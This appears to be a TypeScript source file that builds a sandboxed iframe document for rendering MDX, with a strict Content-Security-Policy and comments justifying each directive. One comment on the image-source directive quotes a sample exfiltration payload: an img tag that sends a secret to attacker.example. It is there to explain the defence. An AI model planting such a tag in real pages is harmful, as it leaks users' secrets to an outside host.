/**
 * Builds the HTML that becomes the guest frame.
 *
 * It is handed to the iframe as `srcdoc` rather than as a URL.
 *
 * A `blob:` URL was measured, not assumed: under `sandbox="allow-scripts"` with
 * no `allow-same-origin`, Chrome 150 does load it, and the resulting document is
 * genuinely opaque (`self.origin === "null"`, `localStorage` and
 * `document.cookie` both throw). So it works. `srcdoc` is still preferred here
 * for three reasons that have nothing to do with whether it loads:
 *
 * - A blob URL is a same-origin resource held in a registry with a lifetime the
 *   host has to manage; forget to revoke it and the guest's whole source stays
 *   reachable from the app's origin for the life of the document.
 * - Chrome is actively partitioning blob URLs by storage key. An opaque-origin
 *   frame reading a blob minted under a different key is exactly the pattern
 *   that work narrows, so it is not something to build a security boundary on.
 * - `srcdoc` has no URL and no fetch: the bytes are handed over by the embedder,
 *   which removes the navigation, the revocation bug, and the cache entry.
 *
 * The cost is that the whole runtime lives in an HTML attribute - measured at
 * ~4.2 MB for a React + Babel guest, which the browser handles without trouble.
 */

/**
 * The frame's Content-Security-Policy, delivered as a `<meta>` element because
 * `srcdoc` has no HTTP response to carry a header.
 *
 * The sandbox attribute already removes the frame's *identity* (no cookies, no
 * storage, no DOM access to the parent). CSP is the second half of the boundary:
 * it removes the frame's *reach*. Between them the document can compute and draw
 * but has no way to talk to anything except its parent.
 */
export interface SandboxCsp {
  /**
   * `'none'`. Everything is opt-in below; nothing inherits a permissive default.
   */
  defaultSrc: string;
  /**
   * `'unsafe-inline' 'unsafe-eval'`.
   *
   * `unsafe-inline` because the guest runtime is inlined into this document -
   * there is no origin to load it from, and no external host is allowed at all,
   * so there is nothing for an injection to reach for.
   *
   * `unsafe-eval` because rendering MDX *is* evaluating code: the renderer
   * compiles the document's JSX with Babel at runtime and evaluates it. Refusing
   * eval would mean refusing interactive documents, which is the feature. This
   * is safe precisely because it happens in a frame with an opaque origin, no
   * storage, and no network: arbitrary evaluation there buys an attacker
   * nothing beyond drawing inside their own box.
   */
  scriptSrc: string;
  /** `'unsafe-inline'`. Documents style themselves; stylesheets cannot exfiltrate. */
  styleSrc: string;
  /**
   * `data: blob:` by default - deliberately *not* `https:`.
   *
   * `<img src="https://attacker.example/?t=' + secret + '">` is the classic
   * CSP-shaped exfiltration channel, and it works even with `connect-src 'none'`.
   * Widening this to a remote scheme re-opens it, so a host that needs remote
   * images should name the specific origins it trusts rather than a scheme.
   */
  imgSrc: string;
  /** `data:`. Same reasoning as images: a remote font URL is a GET with a payload. */
  fontSrc: string;
  /**
   * `'none'`. The single most important directive here. It blocks `fetch`, XHR,
   * `WebSocket`, `EventSource` and `navigator.sendBeacon`, so the only way out
   * of the frame is the capability bridge the host explicitly registered.
   */
  connectSrc: string;
  /** `'none'`. Blocks nested frames, which would otherwise be a fresh sandbox to escape into. */
  frameSrc: string;
  /** `'none'`. A form POST is a navigation with a body - another exfiltration channel. */
  formAction: string;
  /** `'none'`. Stops relative URLs being re-pointed at a remote base. */
  baseUri: string;
  /** `'none'`. Media follows the same logic as images. */
  mediaSrc: string;
}

export const defaultSandboxCsp: SandboxCsp = {
  defaultSrc: "'none'",
  scriptSrc: "'unsafe-inline' 'unsafe-eval'",
  styleSrc: "'unsafe-inline'",
  imgSrc: 'data: blob:',
  fontSrc: 'data:',
  connectSrc: "'none'",
  frameSrc: "'none'",
  formAction: "'none'",
  baseUri: "'none'",
  mediaSrc: "'none'",
};

/**
 * The iframe `sandbox` token list.
 *
 * `allow-scripts` alone. Every omission is load-bearing:
 * - no `allow-same-origin`  -> opaque origin: no cookies, no storage, no parent DOM
 * - no `allow-popups`       -> `window.open` is a no-op
 * - no `allow-top-navigation` -> the document cannot navigate the app away
 * - no `allow-forms`        -> no form submission
 * - no `allow-modals`       -> no `alert`/`confirm` hijacking the app's UI
 * - no `allow-downloads`    -> no drive-by file writes
 *
 * `allow-scripts` without `allow-same-origin` is the specific combination the
 * HTML spec warns about only in the *reverse* case (both together lets the frame
 * remove its own sandbox attribute). Here they are never both present.
 */
export const SANDBOX_ATTRIBUTE = 'allow-scripts';

export interface SandboxFrameDocumentOptions {
  /** Per-instance channel secret; the guest reads it from `window.__MDXKIT_SANDBOX__`. */
  channel: string;
  /** The bundled guest runtime, as JavaScript source. */
  guestScript: string;
  /** CSS injected into the frame. The guest cannot load a stylesheet over the network. */
  styles?: string;
  /** Overrides merged over {@link defaultSandboxCsp}. */
  csp?: Partial<SandboxCsp>;
  /** Forwarded to the guest bootstrap. */
  forwardConsole?: boolean;
}

function serialiseCsp(csp: SandboxCsp): string {
  return [
    `default-src ${csp.defaultSrc}`,
    `script-src ${csp.scriptSrc}`,
    `style-src ${csp.styleSrc}`,
    `img-src ${csp.imgSrc}`,
    `font-src ${csp.fontSrc}`,
    `connect-src ${csp.connectSrc}`,
    `frame-src ${csp.frameSrc}`,
    `form-action ${csp.formAction}`,
    `base-uri ${csp.baseUri}`,
    `media-src ${csp.mediaSrc}`,
  ].join('; ');
}

/**
 * Makes a JavaScript string safe to place between `<script>` tags.
 *
 * The HTML tokeniser ends a script block at the first `</script`, wherever it
 * appears - including inside a string literal in the bundle. `</script` can only
 * legally occur inside a string, template, regex or comment, and in all four
 * `<\/script` means the same thing, so the escape is behaviour-preserving. The
 * same applies to `<!--`, which HTML treats as the start of a script comment.
 */
function escapeScriptBody(source: string): string {
  return source.replace(/<\/(script)/gi, '<\\/$1').replace(/<!--/g, '<\\!--');
}

/** Escapes text destined for an HTML text node. */
function escapeHtmlText(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

/**
 * Minimal typography so a document is legible before it styles itself. Kept
 * deliberately small - the host owns the real stylesheet and passes it in,
 * because the frame cannot fetch one.
 */
const baseStyles = `
*, *::before, *::after { box-sizing: border-box; }
html, body { margin: 0; padding: 0; background: transparent; }
body {
  font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
  font-size: 15px;
  line-height: 1.65;
  color: #0f172a;
  /* The host sizes the frame from reported height, so the frame must never
     produce a scrollbar of its own - that is what "sized to content" means. */
  overflow: hidden;
}
#mdxkit-sandbox-root { padding: 4px; }
`;

export function buildSandboxFrameDocument(options: SandboxFrameDocumentOptions): string {
  const csp = { ...defaultSandboxCsp, ...options.csp };

  // Configuration reaches the guest as inert JSON rather than as generated code,
  // so nothing here can be turned into an injection point.
  const config = JSON.stringify({
    channel: options.channel,
    forwardConsole: options.forwardConsole === true,
  });

  return `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${serialiseCsp(csp)}">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="referrer" content="no-referrer">
<style>${escapeHtmlText(baseStyles)}</style>
${options.styles ? `<style>${escapeHtmlText(options.styles)}</style>` : ''}
</head>
<body>
<div id="mdxkit-sandbox-root"></div>
<script type="application/json" id="mdxkit-sandbox-config">${escapeHtmlText(config)}</script>
<script>${escapeScriptBody(options.guestScript)}</script>
</body>
</html>`;
}
